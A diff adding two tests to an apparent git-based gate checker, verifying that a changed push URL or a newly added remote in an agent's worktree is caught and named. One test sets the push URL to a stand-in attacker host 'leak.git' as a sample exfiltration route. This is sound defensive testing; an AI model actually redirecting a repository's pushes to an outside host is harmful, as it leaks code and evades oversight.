@@ -230,6 +230,37 @@ def test_a_remote_whose_url_changed_fails_and_names_it(task, repo, tmp_path):
     assert result["verdict"] == "FAIL"
 
 
+def test_a_changed_pushurl_fails_and_names_the_remote(task, repo, tmp_path):
+    """`remote.<name>.pushurl` wins over the fetch URL: re-pointing it is how a push leaves unseen."""
+    folder = _unit(task, repo, tmp_path)
+    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
+    git_in(folder, "config", "--worktree", "remote.origin.pushurl", "https://attacker.example/leak.git")
+
+    result = gates.collect(task, "prova")
+
+    remote = _gate(result, "remoto intatto")
+    assert not remote.ok
+    assert "pushurl cambiata" in remote.reason
+    assert "origin" in remote.reason
+    assert "attacker.example" in remote.reason
+    assert result["verdict"] == "FAIL"
+
+
+def test_a_remote_added_after_creation_fails_and_names_it(task, repo, tmp_path):
+    """A remote the unit added is another way out of the copy, even with a blocked pushurl."""
+    folder = _unit(task, repo, tmp_path)
+    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
+    git_in(folder, "remote", "add", "altro", str(tmp_path / "altro.git"))
+
+    result = gates.collect(task, "prova")
+
+    remote = _gate(result, "remoto intatto")
+    assert not remote.ok
+    assert "remoti aggiunti" in remote.reason
+    assert "altro" in remote.reason
+    assert result["verdict"] == "FAIL"
+
+
 def test_a_unit_commit_that_reached_a_remote_fails_and_names_the_ref(task, repo, tmp_path):
     folder = _unit(task, repo, tmp_path)
     _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
